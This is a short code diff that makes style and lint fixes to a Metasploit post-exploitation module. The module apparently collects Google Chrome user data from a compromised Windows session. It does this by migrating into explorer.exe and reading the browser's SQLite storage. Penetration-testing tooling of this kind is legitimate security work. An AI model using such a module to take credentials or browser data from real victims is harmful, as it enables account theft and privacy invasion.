@@ -28,6 +28,11 @@ class MetasploitModule < Msf::Post
           'Kx499',      # x64 support
           'mubix'       # Parse extensions
         ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -94,7 +99,7 @@ class MetasploitModule < Msf::Post
     print_good("==> Downloaded to #{local_path}")
 
     maildb = SQLite3::Database.new(local_path)
-    columns, *rows = maildb.execute2('select * from ItemTable;')
+    _, *rows = maildb.execute2('select * from ItemTable;')
     maildb.close
 
     rows.each do |name, value|
@@ -141,7 +146,7 @@ class MetasploitModule < Msf::Post
     elsif session.arch == ARCH_X64
       inout_fmt = 'Q2'
     else
-      fail_with(Failure::NoTarget, "Session architecture must be either x86 or x64.")
+      fail_with(Failure::NoTarget, 'Session architecture must be either x86 or x64.')
     end
 
     pdatain = [data.length, mem].pack(inout_fmt)
@@ -288,7 +293,7 @@ class MetasploitModule < Msf::Post
       print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
       begin
         session.core.migrate(target_pid)
-      rescue ::Exception => e
+      rescue StandardError => e
         print_error(e.message)
         return false
       end
@@ -300,7 +305,7 @@ class MetasploitModule < Msf::Post
         print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
         begin
           session.core.migrate(target_pid)
-        rescue ::Exception => e
+        rescue StandardError => e
           print_error(e)
           return false
         end
@@ -334,7 +339,7 @@ class MetasploitModule < Msf::Post
       migrate_success = migrate
     end
 
-    host = session.session_host
+    session.session_host
 
     # Get Google Chrome user data path
     env_vars = session.sys.config.getenvs('SYSTEMDRIVE', 'USERNAME')
